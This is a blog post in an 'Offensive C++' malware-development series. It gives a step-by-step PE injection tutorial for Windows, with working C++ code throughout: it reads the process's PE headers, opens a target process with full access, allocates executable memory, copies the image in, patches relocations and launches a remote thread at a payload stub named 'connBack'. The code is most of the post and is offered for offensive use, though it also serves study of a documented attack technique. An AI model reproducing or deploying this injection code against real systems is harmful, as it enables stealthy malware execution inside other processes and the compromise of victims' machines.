---
title: PE Injection
published: true
categories: [Malware dev, C++]
tags: [Malware dev, C++, Process injection]

pin: false
image:
  path: https://github.com/Krypteria/Offensive_CPP/assets/55555187/a7ea575f-6163-46f5-9239-ecaec2ec191f
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
---

In this post we are going to take a step forward in the level of complexity with respect to the previous two posts. This time I am going to discuss a technique with a higher level of sophistication that requires an understanding of the two previously mentioned techniques (not because they are going to be expanded, but because if you don't understand them, this one will be very challenging).

The technique in question is **PE Injection**. First of all, what is a PE?

A PE file, or Portable Executable file, is, very briefly, a file format used in Windows operating systems to store executable code, libraries and other resources needed to run programs. In particular, one of the sections that compose the PE is the **image of the executable**. This image contains the code and resources necessary for its execution, so we could load this image in another process and make it execute it. 

Before explaining the logic behind the technique and how to implement it in C++, let's quickly look at an execution example:

![image](https://github.com/Krypteria/Offensive_CPP/assets/55555187/da6f6acc-cc46-47b2-b60e-8b5251c91209)

As you can see, we have managed to run a message box like notepad. At first glance, it is true that it may seem very similar to the first two techniques discussed in the Offensive C++ series. It is true that the purpose is the same, to get an injection in a process, the difference is in the details.

This post will explain the steps to follow to inject the malicious process image into a remote process and exploit it to execute arbitrary code. By malicious process I mean the process we will execute to perform the PE Injection. 

The first thing we have to do, as you can imagine, is to obtain the image we want to inject. To do this, we will have to move between different structures of the PE file, obtaining a series of values.

- The first thing we will do is look for the **base address** of the malicious process as this is the address from which the PE image starts.
- We will look for the **e_lfanew** value inside the **IMAGE_DOS_HEADER**.
- With the value of e_lfanew and a sum of addresses we will get the address of the **PE Header** or **IMAGE_NT_HEADERS64**.
- Inside the PE Headers we will get the size of the image (SizeOfImage)

Let's go slowly, the first thing we have to do is to find the **base address**. This value, as its name indicates, is the **first memory address of the process** and is the one used as a base to find the rest of the addresses. 

This is quite logical, imagine if the process addresses were absolute addresses, this would mean that the process would always have to be loaded in the same address space, which is impossible as the operating system maps the processes in the addresses it considers appropriate according to the demand, the space to be reserved...  

To solve this problem, addresses are calculated by adding an **RVA** or **Relative Virtual Address** (an offset) to the base address.

In this case, to calculate the base address we do not have to complicate much, we can make use of the function [GetModuleHandle](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea) which, when passed as parameter NULL, returns the base address:

```c++
PVOID sourceImageAddress = GetModuleHandle(NULL);
```

The next thing we have to do is to get the [IMAGE_DOS_HEADER](https://referencesource.microsoft.com/#System.Deployment/System/Deployment/Application/PEStream.cs,74a6abbcc7f5a6da) because inside it there is a pointer to [IMAGE_NT_HEADERS64](https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_nt_headers64) . Let's look at the following image of a PE file:

![image](https://github.com/Krypteria/Offensive_CPP/assets/55555187/c9912ba0-d814-4a53-9ae3-41ee93077876)

From this image we can extract the following conclusions:

- The DOS Header is the first section of the PE file, so it starts from the base address.
- Inside the DOS Header there is a pointer to the PE Header (the value **e_lfanew**). 
- We see that the size of the image (SizeOfImage) is located inside the PE Header (row 0x0050).

Let's start.

As we have just mentioned, the IMAGE_DOS_HEADER is the first thing that is found in the PE file and it starts from the base address but... how much memory does it occupy? how much memory do we have to read?

Simple, because it is a header it has a fixed size so we don't need to worry too much, just cast the type *PIMAGE_DOS_HEADER*, which is a pointer of size IMAGE_DOS_HEADER, from the base address, this will make our variable to have the right size.

```c++
PIMAGE_DOS_HEADER sourceDOSHeader = (PIMAGE_DOS_HEADER)sourceImageAddress;
```

Once we have a pointer to the IMAGE_DOS_HEADER, we have to access the PE header, also known as IMAGE_NT_HEADERS64. To do this, we obtain the e_lfanew value (the pointer to the PE Header) using the PIMAGE_DOS_HEADER pointer we obtained in the previous step. 

```c++
sourceDOSHeader->e_lfanew
```

Since the value of e_lfanew is an RVA, we have to add the base address to get the address of the IMAGE_NT_HEADERS64. In this case we cast the variable to type *PIMAGE_NT_HEADERS64* to make it the appropriate size. 

```c++
PIMAGE_NT_HEADERS64 sourceNTHeaders64 = (PIMAGE_NT_HEADERS64)((DWORD_PTR)sourceImageAddress + sourceDOSHeader->e_lfanew);
```

Once we have a pointer to the PE Header (or IMAGE_NT_HEADERS64), we can access the **SizeOfImage** field: 

```c++
DWORD sourceImageSize = sourceNTHeaders64->OptionalHeader.SizeOfImage;
```

The next three steps should already be like a mantra for you if you have been following the series of posts x). 

Once we have bounded the image we want to inject, we have to get a Handle from the remote process to be able to interact with it.

```c++
HANDLE hRemote = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
if (hRemote == NULL){
    printf("\n%s Cannot get the handle to the process\n", err);
    return EXIT_FAILURE;
}
```

With the Handle obtained, we reserve memory in the remote process, the size of the memory to reserve will be the size of the image.

```c++
LPVOID bAddress = VirtualAllocEx(hRemote, NULL, sourceImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

if(bAddress == NULL){
    printf("%s Cannot allocate memory for the shellcode\n", err);
    return EXIT_FAILURE;
}
```

We write the image of the PE in the remote process from the address obtained in the previous step.

```c++
if(WriteProcessMemory(hRemote, bAddress, sourceImageAddress, sourceNTHeaders64->OptionalHeader.SizeOfImage, NULL) == 0){
    printf("%s Cannot write on memory, error %s\n", err, GetLastError());
    return EXIT_FAILURE;
}
```

One mistake that could occur at this point is to create a remote thread and run from the memory address we injected the PE into. Unfortunately, this would most likely cause the process to crash or not work at all. 

This is due to something that we have already discussed and is fundamental in this type of technique, the **RVA**.

Earlier we said that **all PE memory addresses are relative** and are used to calculate the addresses of the different PE resources by summing a base address to them. Let's see an example:

Suppose we have a PE file with the following values:

```c++
BaseAddress = 0x100

reloc table
-----------
relocOffset1 = 0x010
relocOffset2 = 0x020
```

This means that the absolute addresses we will get when we sum the RVAs of the reloc table to the base address will be:

```c++
AbsoluteAddress1 = BaseAddress + relocOffset1 = 0x100 + 0x010 = 0x110
AbsoluteAddress2 = BaseAddress + relocOffset2 = 0x100 + 0x020 = 0x120
```

If we now move the PE to the address 0x500, the absolute addresses would be wrong because **the base address** has not changed, we have copied the PE with its previous values. To fix this we would have to calculate the **delta** value to be summed to the RVAs instead of the BaseAddress:

```c++
delta = currentAddr - oldAddr = 0x500 - 0x100 = 0x400
AbsoluteAddress1 = delta + relocOffset1 = 0x400 + 0x010 = 0x410
AbsoluteAddress2 = delta + relocOffset2 = 0x400 + 0x020 = 0x420
```

In the case of our code we would calculate the delta as follows.

```c++
DWORD_PTR delta = (DWORD_PTR)bAddress - (DWORD_PTR)sourceImageAddress;
```

Now comes the tricky part, we have to modify the reloc table of the **remote process** (which is the one that contains the RVAs) by summing the delta. 

The first thing we have to do is to get the address of the reloc table. We could get the address of the reloc table of the PE in the remote process but... why? it contains the same values as the reloc table of the local PE, we can simply read this last one using pointers instead of having to use the [ReadProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-readprocessmemory) function.

The table address can be found in the **DataDirectory** field of the **OptionalHeaders** of IMAGE_NT_HEADERS64. This field is an array of IMAGE_DATA_DIRECTORY structures.

```c++
typedef struct _IMAGE_DATA_DIRECTORY {
    DWORD VirtualAddress;
    DWORD Size;
} IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;
```

In the case of the reloc table, we will obtain its RVA as follows:

```c++
sourceNTHeaders64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
```

As it is an RVA we have to add the base address:

```c++
PIMAGE_BASE_RELOCATION relocTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)sourceImageAddress + sourceNTHeaders64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
```

Before going any further, it is important to understand what the relocation table contains. The relocation table is composed of a set of Offsets, for each Offset the following fields are defined:

- An RVA indicating the address of the PE to be relocated.
- A Block Size indicating the size of the values associated to the Offset.
- Entry count entries

In the following image we can see it more clearly:

![image](https://github.com/Krypteria/Offensive_CPP/assets/55555187/73e07c6d-11c9-4869-9c47-1b252fed1a95)

As we can see: 

- the RVA is defined by 4 Bytes
- The Block Size is defined by 4 Bytes
- Each entry is defined by 2 Bytes.

The first 8 Bytes (RVA and Block Size) are defined in the following structure:

```c++
typedef struct _IMAGE_BASE_RELOCATION {
    DWORD VirtualAddress;
    DWORD SizeOfBlock;
} IMAGE_BASE_RELOCATION;
```

If we take a look at the values that conform the Offset AE00 we can find the following:

![image](https://github.com/Krypteria/Offensive_CPP/assets/55555187/9c7323ba-b6da-48be-b669-737be93a664f)

From this image we can get the following conclusions:

- Each row of the table has a different number of entries indicated by the Entries Count value.
- When the value of the entry is 0, a skip is applied.

But... what do the 2-byte entries contain? 

Each value in the relocation table is composed of:

- 4 bits of type
- 12 offset bits

The type bits, which indicate what kind of reallocation should be performed, these are defined in the [PE format](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format) of Windows but the most relevant ones are:

|---|---|---|
|IMAGE_REL_BASED_HIGH|1|The base relocation adds the high 16 bits of the difference to the 16-bit field at offset. The 16-bit field represents the high value of a 32-bit word.|
|IMAGE_REL_BASED_LOW|2|The base relocation adds the low 16 bits of the difference to the 16-bit field at offset. The 16-bit field represents the low half of a 32-bit word.|
|IMAGE_REL_BASED_HIGHLOW|3|The base relocation applies all 32 bits of the difference to the 32-bit field at offset.|
|IMAGE_REL_BASED_DIR64|10|The base relocation applies the difference to the 64-bit field at offset.|

The 12 offset bits are an RVA which, added to the base address, is used to calculate the absolute address to which the 4-byte VirtualAddress should be mapped. In other words, this offset is the value that we have to modify.

As the values of the relocation table entries do not have a type defined by a structure, we can define them as follows:

```c++
typedef struct BASE_RELOCATION_ENTRY {
    USHORT Offset : 12;
    USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;
```

With all this in mind, we are going to dissect the rest of the code:

First we check if the delta is different from 0, this is done as it may happen that the PE was inserted at the same address it was at, in that case we would not have to change anything.

```c++
if(delta != 0){
    //Do stuff
}
```

As long as the entry has content, what we do is the following:

We calculate the number of entries defined in the Offset, for this, we have to take into consideration that, we have to discount the size of the IMAGE_BASE_RELOCATION structure from the total size, and divide the result by the size of a single entry, in other words, 2 Bytes.

```c++
DWORD relocTableEntries = (relocTable->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(USHORT);
```

We obtain a pointer to the first entry of the Offset, for this, we only have to sum to the memory address of the reloc table, the size of IMAGE_BASE_RELOCATION (8 Bytes).

```c++
PBASE_RELOCATION_ENTRY relocationEntries = (PBASE_RELOCATION_ENTRY)(relocTable + sizeof(IMAGE_BASE_RELOCATION));
```

All together would look as follows:

```c++
DWORD relocTableEntries = 0;
PBASE_RELOCATION_ENTRY relocationEntries = NULL;

while (relocTable->SizeOfBlock > 0 ){
    relocTableEntries = (relocTable->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(USHORT);
    relocationEntries = (PBASE_RELOCATION_ENTRY)(relocTable + sizeof(IMAGE_BASE_RELOCATION));
    ...
```

Once we have the pointer to the first entry and the number of entries, what we do is to move the pointer in each iteration using the following notation:

```c++
for(short i = 0; i < relocTableEntries; i++){
    relocationEntries[i]
}
```

Inside the loop, we calculate the memory address where the offset we have to modify is located. This memory address will be the base address plus the address of the reloc table plus the offset of the entry. 

```c++
PDWORD_PTR pEntryValue = (PDWORD_PTR)((DWORD_PTR)sourceImageAddress + relocTable->VirtualAddress + relocationEntries[i].Offset);
```

With the address obtained, we check that the relocation type is 64 bits. As we have to write to a remote process, we use the [WriteProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory) function and modify the memory address of the offset with the original value plus the delta (it is important to add the delta also in the memory address we want to overwrite).

```c++
if(relocationEntries[i].Type == IMAGE_REL_BASED_DIR64){
    WriteProcessMemory(hRemote, pEntryValue + delta, (LPCVOID)(*pEntryValue + delta), sizeof(LPCVOID), 0);
}
```

All together would look like this:

```c++
while (relocTable->SizeOfBlock > 0){
    ...
    for(short i = 0; i < relocTableEntries; i++){
        if(relocationEntries[i].Offset != 0){
            PDWORD_PTR pEntryValue = (PDWORD_PTR)((DWORD_PTR)sourceImageAddress + relocTable->VirtualAddress + relocationEntries[i].Offset);
            if(relocationEntries[i].Type == IMAGE_REL_BASED_DIR64){
                WriteProcessMemory(hRemote, pEntryValue + delta, (LPCVOID)(*pEntryValue + delta), sizeof(LPCVOID), 0);
            }
        }
    }
    relocTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)relocTable + relocTable->SizeOfBlock);
}
```

Well, the hardest part is over. Now we go for the top of the cake.

We create a function that will contain the payload we want to execute. 

```c++
void connBack(){
    //evil stuff
}
```

In C and C++, we can obtain the address of a function by simply referencing its name, which is very convenient for the next step. Using the function [CreateRemoteThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread), we start a thread that points to the address of the function **connBack** of the PE injected in the remote process, for this, we sum the delta to the original address.

```c++
HANDLE hThread = CreateRemoteThread(hRemote, NULL, 0, (LPTHREAD_START_ROUTINE)((DWORD_PTR)connBack + delta), NULL, 0, NULL);

if(hThread == NULL){
    printf("%s Cannot create remote Thread\n", err);
    return EXIT_FAILURE;
}

printf("%s Remote thread executed succesfully\n", ok);

CloseHandle(hRemote);
CloseHandle(hThread);

return EXIT_SUCCESS;
```

As always, the full code can be found in the [Offensive CPP](https://github.com/Krypteria/Offensive_CPP) repository on my Github. Finally, I also provide a link to the [Mitre](https://attack.mitre.org/techniques/T1055/002/) IOCs.